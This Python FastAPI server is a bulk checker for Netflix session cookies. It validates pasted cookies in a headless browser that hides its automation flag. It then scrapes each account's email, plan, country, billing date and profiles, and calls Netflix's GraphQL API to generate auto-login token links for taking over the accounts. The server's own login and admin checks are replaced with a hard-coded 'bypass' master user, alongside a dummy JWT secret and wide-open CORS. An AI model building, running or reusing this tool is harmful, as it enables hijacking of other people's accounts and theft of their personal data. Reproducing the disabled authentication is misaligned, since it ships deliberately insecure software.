from fastapi import FastAPI, APIRouter, HTTPException, UploadFile, File, Header
from starlette.middleware.cors import CORSMiddleware
import os
import logging
import asyncio
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta
import secrets
import jwt
import httpx
from bs4 import BeautifulSoup
import re
import json

ROOT_DIR = Path(__file__).parent
mongo_url = os.environ.get('MONGO_URL', '')
client = None
db = None
JWT_SECRET = os.environ.get('JWT_SECRET', 'dummy-secret-for-bypass')
JWT_ALGORITHM = "HS256"

app = FastAPI()
api_router = APIRouter(prefix="/api")

# --- Pydantic Models ---
class KeyLogin(BaseModel):
    key: str

class KeyCreate(BaseModel):
    label: str
    max_devices: int = 1
    custom_key: Optional[str] = None

class KeyUpdate(BaseModel):
    label: Optional[str] = None
    max_devices: Optional[int] = None

class CookieCheckRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"

class FreeCookieAdd(BaseModel):
    email: Optional[str] = None
    plan: Optional[str] = None
    country: Optional[str] = None
    member_since: Optional[str] = None
    next_billing: Optional[str] = None
    profiles: List[str] = []
    browser_cookies: str = ""
    full_cookie: str = ""
    nftoken: Optional[str] = None
    nftoken_link: Optional[str] = None

class FreeCookieLimitUpdate(BaseModel):
    limit: int

class TVCodeRequest(BaseModel):
    code: str
    cookie_id: str

# --- Auth Helpers (BYPASS) ---
async def get_current_user(authorization: str = Header(None)):
    # COMPLETE BYPASS - always return master user
    print("BYPASS: get_current_user - returning master access")
    return {
        "id": "bypass-id",
        "label": "Bypass Master",
        "is_master": True,
        "session_id": "bypass-session"
    }

async def require_admin(authorization: str = Header(None)):
    user = await get_current_user(authorization)
    return user  # always allow since get_current_user returns master

# --- Cookie Parsing ---
def parse_netscape_cookies(text):
    cookies = {}
    for line in text.strip().split('\n'):
        line = line.strip()
        if line.startswith('#') or not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
        elif '=' in line:
            for pair in line.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, _, v = pair.partition('=')
                    cookies[k.strip()] = v.strip()
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {item['name']: item['value'] for item in data if 'name' in item and 'value' in item}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def parse_cookies_auto(text):
    text = text.strip()
    if text.startswith('[') or text.startswith('{'):
        result = parse_json_cookies(text)
        if result:
            return result
    return parse_netscape_cookies(text)

# --- NFToken Generator (from Netflix GraphQL API) ---
async def generate_nftoken(cookies: dict):
    """Generate Netflix auto-login token from cookies using Netflix's GraphQL API"""
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        norm[k.lower()] = v

    netflix_id = norm.get('NetflixId') or norm.get('netflixid')
    secure_id = norm.get('SecureNetflixId') or norm.get('securenetflixid')
    nfvdid = norm.get('nfvdid')

    if not netflix_id or not secure_id:
        return False, None, "Missing required cookies (NetflixId, SecureNetflixId)"

    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    }

    nft_headers = {
        'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
        'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/',
        'Cookie': cookie_str
    }

    try:
        async with httpx.AsyncClient(timeout=30.0) as http_client:
            resp = await http_client.post(
                'https://android13.prod.ftl.netflix.com/graphql',
                headers=nft_headers,
                json=payload
            )
            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    token = data['data']['createAutoLoginToken']
                    return True, token, None
                elif 'errors' in data:
                    return False, None, f"API Error: {json.dumps(data.get('errors', []))}"
                else:
                    return False, None, "Unexpected response"
            else:
                return False, None, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, None, str(e)

# --- Browser Cookie Enrichment (Playwright) ---
async def get_browser_data(cookies: dict):
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--disable-blink-features=AutomationControlled']
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                viewport={'width': 1920, 'height': 1080},
                locale='en-US'
            )
            cookie_list = [{
                "name": name, "value": value,
                "domain": ".netflix.com", "path": "/",
                "secure": True, "sameSite": "None"
            } for name, value in cookies.items()]
            await context.add_cookies(cookie_list)
            page = await context.new_page()
            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}

            try:
                await page.goto("https://www.netflix.com/browse", timeout=25000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(2000)
            except Exception:
                pass

            url = page.url
            if '/login' in url or '/LoginHelp' in url:
                await browser.close()
                return False, "", {}, info

            all_browser_cookies = await context.cookies()
            netflix_cookies = [c for c in all_browser_cookies if 'netflix' in c.get('domain', '').lower()]
            browser_cookies_str = '; '.join([f"{c['name']}={c['value']}" for c in netflix_cookies])
            browser_cookies_dict = {c['name']: c['value'] for c in netflix_cookies}

            country_match = re.search(r'netflix\.com/([a-z]{2})/', url)
            if country_match:
                info['country'] = country_match.group(1).upper()

            try:
                await page.goto("https://www.netflix.com/account/security", timeout=20000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(2000)
                security_html = await page.content()
                email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', security_html)
                if email_match:
                    info['email'] = email_match.group(1)
            except Exception as e:
                logger.warning(f"Security page error: {e}")

            try:
                await page.goto("https://www.netflix.com/YourAccount", timeout=20000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await page.wait_for_timeout(3000)
                account_html = await page.content()
                ctx_match = re.search(r'reactContext\s*=\s*({.*?});', account_html, re.DOTALL)
                if ctx_match:
                    try:
                        raw_json = ctx_match.group(1)
                        raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
                        raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
                        ctx = json.loads(raw_json)
                        models = ctx.get('models', {})
                        user_info = models.get('userInfo', {}).get('data', {})
                        if not info['email']:
                            info['email'] = user_info.get('membershipEmail') or user_info.get('email')
                        if not info['country']:
                            info['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
                        info['member_since'] = format_member_since(user_info.get('memberSince'))
                        plan_data = models.get('planInfo', {}).get('data', {})
                        account_data = models.get('accountInfo', {}).get('data', {})
                        max_streams = account_data.get('maxStreams')
                        if max_streams is not None:
                            if max_streams >= 4:
                                info['plan'] = 'Premium (UHD)'
                            elif max_streams >= 2:
                                info['plan'] = 'Standard (HD)'
                            else:
                                info['plan'] = 'Basic'
                            logger.info(f"Plan from maxStreams={max_streams}: {info['plan']}")
                        if not info['plan']:
                            raw_plan = plan_data.get('planName')
                            if raw_plan:
                                info['plan'] = normalize_plan_name(raw_plan)
                        if not info['email'] and account_data.get('emailAddress'):
                            info['email'] = account_data['emailAddress']
                        if not info['country'] and account_data.get('country'):
                            info['country'] = account_data['country']
                        info['next_billing'] = plan_data.get('nextBillingDate')
                        profiles_data = models.get('profiles', {}).get('data', [])
                        info['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
                    except Exception as e:
                        logger.warning(f"reactContext parse error: {e}")
                if not info['plan']:
                    try:
                        dom_plan = await page.evaluate("""
                            () => {
                                const selectors = [
                                    '[data-uia="plan-label"]',
                                    '[data-uia="plan-section-label"]',
                                    '.account-section-membersince + .account-section .account-section-item b',
                                    '.planInfo .planName',
                                    '.accountSectionContent .plan-label',
                                ];
                                for (const sel of selectors) {
                                    const el = document.querySelector(sel);
                                    if (el && el.textContent.trim()) return el.textContent.trim();
                                }
                                const allText = document.body.innerText;
                                const planPatterns = [
                                    /Premium\\s*(?:\\(UHD\\)|UHD|4K)?/i,
                                    /Standard\\s*(?:with\\s*ads|avec\\s*pub|con\\s*anuncios)?/i,
                                    /Standard\\s*(?:\\(HD\\)|HD)?/i,
                                    /Basic\\s*(?:with\\s*ads)?/i,
                                    /Offre\\s+(?:Premium|Standard|Essentiel|Basique)[^\\n]*/i,
                                ];
                                try {
                                    const ctx = window.netflix?.appContext?.state?.models?.planInfo?.data;
                                    if (ctx?.planName) return ctx.planName;
                                } catch(e) {}
                                try {
                                    const rc = window.netflix?.reactContext?.models?.planInfo?.data;
                                    if (rc?.planName) return rc.planName;
                                } catch(e) {}
                                return null;
                            }
                        """)
                        if dom_plan:
                            logger.info(f"DOM plan extraction: {dom_plan}")
                            info['plan'] = normalize_plan_name(dom_plan)
                    except Exception as e:
                        logger.warning(f"DOM plan extraction error: {e}")
                if not info['plan']:
                    plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', account_html)
                    for pm in plan_matches:
                        normalized = normalize_plan_name(pm)
                        if normalized:
                            logger.info(f"JSON regex plan: {pm} -> {normalized}")
                            info['plan'] = normalized
                            break
                if not info['plan']:
                    for pl in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                        if pl.lower() in account_html.lower():
                            info['plan'] = normalize_plan_name(pl)
                            logger.info(f"Text fallback plan: {pl} -> {info['plan']}")
                            break
                if not info['email']:
                    m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', account_html)
                    if m:
                        info['email'] = m.group(1)
            except Exception as e:
                logger.warning(f"Account page error: {e}")
            await browser.close()
            return True, browser_cookies_str, browser_cookies_dict, info
    except Exception as e:
        logger.error(f"Browser data extraction failed: {e}")
        return None, "", {}, {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}

# --- Netflix Checker ---
async def check_netflix_cookie(cookie_text, format_type="auto"):
    if format_type == "json":
        cookies = parse_json_cookies(cookie_text)
    elif format_type == "netscape":
        cookies = parse_netscape_cookies(cookie_text)
    else:
        cookies = parse_cookies_auto(cookie_text)
    if not cookies:
        return {
            "status": "invalid",
            "email": None, "plan": None, "member_since": None,
            "country": None, "next_billing": None, "profiles": [],
            "full_cookie": cookie_text[:500],
            "browser_cookies": "",
            "nftoken": None, "nftoken_link": None,
            "error": "Could not parse cookies"
        }
    result = {
        "status": "expired",
        "email": None, "plan": None, "member_since": None,
        "country": None, "next_billing": None, "profiles": [],
        "full_cookie": cookie_text,
        "browser_cookies": "",
        "nftoken": None, "nftoken_link": None,
        "error": None
    }
    browser_cookies_dict = {}
    try:
        is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)
        if is_logged_in:
            result["status"] = "valid"
            result["browser_cookies"] = browser_cookies_str
            result["email"] = info.get("email")
            result["plan"] = info.get("plan")
            result["country"] = info.get("country")
            result["member_since"] = info.get("member_since")
            result["next_billing"] = info.get("next_billing")
            result["profiles"] = info.get("profiles", [])
            logger.info(f"Playwright: VALID | email={info.get('email')} | cookies={len(browser_cookies_dict)} keys")
        elif is_logged_in is False:
            logger.info("Playwright: session expired/login redirect")
    except Exception as e:
        logger.warning(f"Playwright failed: {e}")
    nftoken_attempts = []
    if browser_cookies_dict:
        nftoken_attempts.append(("browser", browser_cookies_dict))
    nftoken_attempts.append(("original", cookies))
    for source, nft_cookies in nftoken_attempts:
        try:
            success, nft, nft_err = await generate_nftoken(nft_cookies)
            if success and nft:
                result["status"] = "valid"
                result["nftoken"] = nft
                result["nftoken_link"] = f"https://netflix.com/?nftoken={nft}"
                logger.info(f"NFToken: SUCCESS (from {source} cookies)")
                break
            else:
                logger.info(f"NFToken ({source}): {nft_err}")
        except Exception as e:
            logger.warning(f"NFToken ({source}) error: {e}")
    if result["status"] != "valid" or not result["email"]:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            httpx_cookies = browser_cookies_dict if browser_cookies_dict else cookies
            async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
                if not result["email"]:
                    try:
                        sec_resp = await http.get(
                            'https://www.netflix.com/account/security',
                            cookies=httpx_cookies, headers=headers
                        )
                        sec_url = str(sec_resp.url)
                        if '/login' not in sec_url:
                            em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', sec_resp.text)
                            if em:
                                result['email'] = em.group(1)
                                if result["status"] != "valid":
                                    result["status"] = "valid"
                    except Exception:
                        pass
                if not result["plan"] or not result["country"]:
                    try:
                        acc_resp = await http.get(
                            'https://www.netflix.com/YourAccount',
                            cookies=httpx_cookies, headers=headers
                        )
                        acc_url = str(acc_resp.url)
                        if '/login' not in acc_url:
                            if result["status"] != "valid":
                                result["status"] = "valid"
                            html = acc_resp.text
                            soup = BeautifulSoup(html, 'lxml')
                            for script in soup.find_all('script'):
                                text = script.string or ''
                                if 'reactContext' in text:
                                    match = re.search(r'reactContext\s*=\s*({.*?});', text, re.DOTALL)
                                    if match:
                                        try:
                                            raw_json = match.group(1)
                                            raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
                                            raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
                                            ctx = json.loads(raw_json)
                                            models = ctx.get('models', {})
                                            user_info = models.get('userInfo', {}).get('data', {})
                                            if not result['email']:
                                                result['email'] = user_info.get('membershipEmail') or user_info.get('email')
                                            if not result['country']:
                                                result['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
                                            if not result['member_since']:
                                                result['member_since'] = format_member_since(user_info.get('memberSince'))
                                            plan_info = models.get('planInfo', {}).get('data', {})
                                            account_data = models.get('accountInfo', {}).get('data', {})
                                            max_streams = account_data.get('maxStreams')
                                            if max_streams is not None and not result['plan']:
                                                if max_streams >= 4:
                                                    result['plan'] = 'Premium (UHD)'
                                                elif max_streams >= 2:
                                                    result['plan'] = 'Standard (HD)'
                                                else:
                                                    result['plan'] = 'Basic'
                                            if not result['plan']:
                                                raw_plan = plan_info.get('planName')
                                                if raw_plan:
                                                    result['plan'] = normalize_plan_name(raw_plan)
                                            if not result['email'] and account_data.get('emailAddress'):
                                                result['email'] = account_data['emailAddress']
                                            if not result['country'] and account_data.get('country'):
                                                result['country'] = account_data['country']
                                            if not result['next_billing']:
                                                result['next_billing'] = plan_info.get('nextBillingDate')
                                            if not result['profiles']:
                                                profiles_data = models.get('profiles', {}).get('data', [])
                                                result['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
                                        except Exception:
                                            pass
                            if not result['country']:
                                cm = re.search(r'netflix\.com/([a-z]{2})/', acc_url)
                                if cm:
                                    result['country'] = cm.group(1).upper()
                            if not result['email']:
                                em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
                                if em:
                                    result['email'] = em.group(1)
                            if not result['plan']:
                                plan_matches = re.findall(r'"planName"\s*:\s*"([^"]+)"', html)
                                for pm in plan_matches:
                                    normalized = normalize_plan_name(pm)
                                    if normalized:
                                        result['plan'] = normalized
                                        break
                            if not result['plan']:
                                for p in ['Standard with ads', 'Standard avec pub', 'Premium', 'Standard', 'Basic with ads', 'Basic', 'Mobile']:
                                    if p.lower() in html.lower():
                                        result['plan'] = normalize_plan_name(p)
                                        break
                        elif result["status"] != "valid":
                            result["status"] = "expired"
                            result["error"] = "Cookie expired - redirected to login"
                    except Exception:
                        pass
        except Exception as e:
            logger.warning(f"httpx fallback error: {e}")
    if result["status"] == "expired" and not result["error"]:
        result["error"] = "Cookie expired or invalid"
    return result

# --- Auth Routes (BYPASS) ---
@app.post("/api/auth/login")
async def login(data: KeyLogin):
    # TEMP BYPASS - always succeed
    print("BYPASS: login called with key:", data.key)
    session_id = str(uuid.uuid4())
    token = jwt.encode(
        {
            "key_id": "bypass-id",
            "session_id": session_id,
            "is_master": True,
            "exp": datetime.now(timezone.utc) + timedelta(days=7)
        },
        JWT_SECRET, algorithm=JWT_ALGORITHM
    )
    return {
        "token": token,
        "user": {
            "id": "bypass",
            "label": "Bypass Master",
            "is_master": True
        }
    }

@app.post("/api/auth/logout")
async def logout():
    return {"message": "Logged out (bypass)"}

@app.get("/api/auth/me")
async def get_me():
    return {"id": "bypass", "label": "Bypass Master", "is_master": True}

# --- Cookie Check Routes (keep as is - now protected by bypass) ---
_check_semaphore = asyncio.Semaphore(5)

async def check_cookie_with_semaphore(block, format_type, job_id, index, total, user):
    async with _check_semaphore:
        result = await check_netflix_cookie(block, format_type)
        # Skip DB updates for bypass mode
        return result

async def run_bulk_check(job_id, cookie_blocks, format_type, user):
    tasks = [
        check_cookie_with_semaphore(block, format_type, job_id, i, len(cookie_blocks), user)
        for i, block in enumerate(cookie_blocks)
    ]
    await asyncio.gather(*tasks)
    # Skip DB update

@app.post("/api/check")
async def check_cookies(data: CookieCheckRequest):
    cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', data.cookies_text.strip())
    cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]
    if not cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found")
    check_id = str(uuid.uuid4())
    total = len(cookie_blocks)
    asyncio.create_task(run_bulk_check(check_id, cookie_blocks, data.format_type, {"is_master": True}))
    return {
        "id": check_id,
        "total": total,
        "status": "processing"
    }

# Keep other routes as is (they now use bypassed get_current_user)

# Include router
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Skip startup seeding since we're bypassing
# Comment out or remove the @app.on_event("startup") block if you want
# @app.on_event("startup")
# async def seed_master_key():
#     pass  # no need

@app.on_event("shutdown")
async def shutdown_db_client():
    if client:
        client.close()
